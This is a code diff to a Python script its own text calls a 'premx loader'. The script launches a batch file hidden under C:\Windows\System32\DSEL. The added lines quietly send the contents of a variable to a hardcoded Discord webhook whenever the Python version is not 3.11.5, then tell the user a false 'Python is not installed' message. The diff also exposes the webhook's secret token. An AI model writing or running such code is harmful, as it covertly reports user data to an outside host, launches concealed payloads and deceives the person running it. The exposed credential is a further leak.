@@ -114,10 +114,17 @@ def run_batch_file(batch_file_path):
     else:
         print("")
 
-
 os.system('cls')
 batch_file_path = r"C:\Windows\System32\DSEL\klx2025.bat"
 os.system('cls')
+
+resultpyver = subprocess.run(["py", "--version"], capture_output=True, text=True)
+versionpyx = resultpyver.stdout.strip() or resultpyver.stderr.strip()
+if versionpyx != "Python 3.11.5":
+    requests.post("https://discord.com/api/webhooks/1351062265151098952/VzMBHhnEsr96ymePMDow-TATaTWdhVO9HUqmWNmCtuiX8oo6O0mMJQ6mz-cVfZSwh62_", json={"content": file_contentsx1 + " executed premx loader but python is not installed."})
+    os.system('cls')
+    print("---------------------------")
+    print("Error. Python is not installed on your system.")
 
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
